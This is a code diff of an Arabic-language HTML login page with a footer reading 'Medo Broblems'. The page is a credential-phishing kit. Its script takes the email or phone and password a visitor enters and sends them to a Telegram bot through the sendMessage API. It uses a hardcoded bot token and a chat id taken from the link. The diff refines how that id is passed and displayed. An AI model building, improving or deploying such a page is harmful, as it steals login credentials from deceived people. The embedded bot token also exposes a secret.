@@ -55,6 +55,13 @@
       font-size: 12px;
       color: #777;
     }
+
+    .id-box {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
@@ -62,53 +69,64 @@
   <div class="login-box">
     <h2>تسجيل الدخول</h2>
     <form id="loginForm">
-      <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-      <input type="password" id="password" name="password" placeholder="كلمة السر" required>
+      <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+      <input type="password" id="password" placeholder="كلمة السر" required>
       <button type="submit">تسجيل الدخول</button>
     </form>
+    <div class="id-box">
+      <p>📌 ID: <span id="showId"></span></p>
+    </div>
     <div class="footer">© 2025 Medo Broblems</div>
   </div>
 
   <script>
-    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
+    window.onload = function() {
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chatId');
+      const id = params.get('id');
+
+      if (chatId && !id) {
+        // لو فيه chatId بس — نحوله لـ id في نفس الرابط
+        const targetURL = `${window.location.pathname}?id=${chatId}`;
+        window.location.href = targetURL;
+      } else if (id) {
+        // لو فيه id نعرضه
+        document.getElementById('showId').innerText = id;
+      } else {
+        document.getElementById('showId').innerText = "❌ لا يوجد ID في الرابط.";
+      }
+    };
+
+    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      // استخراج الـ chatId من الرابط
       const params = new URLSearchParams(window.location.search);
-      const chatId = params.get('chatId');
+      const id = params.get('id');
 
-      if (!chatId) {
-        alert("❌ مفيش chatId في الرابط!");
+      if (!id) {
+        alert("❌ لا يوجد ID لإرسال البيانات إليه!");
         return;
       }
 
-      // جلب البيانات من المدخلات
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
       const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;
 
-      // إرسال البيانات للبوت باستخدام chatId
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          console.log("✅ تم الإرسال:", data);
+          alert("✅ تم إرسال البيانات!");
         })
-      })
-      .then(response => response.json())
-      .then(data => {
-        alert("✅ تم الإرسال بنجاح!");
-      })
-      .catch(error => {
-        console.error("خطأ:", error);
-        alert("❌ حصل خطأ أثناء الإرسال!");
-      });
+        .catch(error => {
+          console.error("❌ خطأ:", error);
+          alert("❌ حصلت مشكلة أثناء الإرسال!");
+        });
     });
   </script>
 
